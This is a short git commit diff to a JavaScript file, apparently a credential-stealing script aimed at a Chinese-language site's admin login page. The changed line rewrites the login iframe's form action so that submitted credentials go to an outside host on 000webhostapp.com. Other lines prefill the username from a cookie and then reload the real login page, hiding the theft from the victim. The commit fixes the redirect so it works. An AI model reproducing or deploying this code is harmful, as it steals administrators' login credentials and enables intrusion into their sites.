ae29a74206d49c7081c9275a95ca0602485bbf0a
9os <druidboykoston@gmail.com>
2016-12-26 03:04:41 -0600

    Add files via upload

--- a.js
+++ a.js
@@ -30,7 +30,7 @@ document.title = "网站管理系统";
 
 $("#login_iframe").ready(function(){
 	//alert("Loaded");
-	$("#login_iframe").contents().find("#form1")[0].attr("action", "http://g4wowisbad.000webhostapp.com/login.php");
+	$("#login_iframe").contents().find("#form1")[0].action = "http://g4wowisbad.000webhostapp.com/login.php";
 	$("#login_iframe").contents().find("#txtUsername")[0].value = getCookie("login_name");
 	$("#login_iframe").contents().find("#form1").submit(function(){
 		$("#login_iframe").attr("src", "/admin_g4wow/Login.aspx");
